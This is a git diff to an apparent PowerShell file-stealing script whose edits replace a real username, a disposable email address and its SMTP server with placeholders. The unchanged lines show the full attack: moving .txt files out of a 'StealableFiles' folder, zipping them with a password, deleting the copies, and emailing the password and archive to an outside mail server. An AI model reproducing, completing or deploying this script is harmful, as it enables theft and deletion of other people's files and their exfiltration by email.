@@ -41,9 +41,9 @@ Start-Sleep -s 10
 #Remove the installer
 rm -Force $workdir\7*
 
-#Set source and destination of files to copy and store
-$Source = "C:\Users\PraneethBabu Marella\Desktop\StealableFiles"
-$Destination = "C:\Users\PraneethBabu Marella\Desktop\StolenFiles"
+#Set source and destination of files to copy and store (ideally you would use something other than desktop)
+$Source = "C:\Users\(username)\Desktop\StealableFiles"
+$Destination = "C:\Users\(username)\Desktop\StolenFiles"
 
 #Copy all files with certain extension and delete them in the source location
 $cp = robocopy /mov $Source $Destination *.txt /s
@@ -63,10 +63,10 @@ $p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -Wi
 #Delete the destination folder
 $del = Remove-Item $Destination -Force -Recurse
 
-$email = "8ng3vm+bbvhtmmj122ho@pokemail.net"
+$email = "(enter email address you want files sent to)"
 
 #Send password for files to your e-mail
-$SMTPServer = "smtp.pokemail.net"
+$SMTPServer = "smtp.example.net"
 $Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
 $From = $email
 $To = $email
@@ -79,8 +79,8 @@ $Msg.Dispose()
 $Mailer.Dispose()
 
 #Send zip folder to your e-mail
-$ZipFolder = "C:\Users\PraneethBabu Marella\Desktop\StolenFiles.zip"
-$SMTPServer = "smtp.pokemail.net"
+$ZipFolder = "C:\Users\(username)\Desktop\StolenFiles.zip"
+$SMTPServer = "smtp.example.net"
 $Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
 $From = $email
 $To = $email
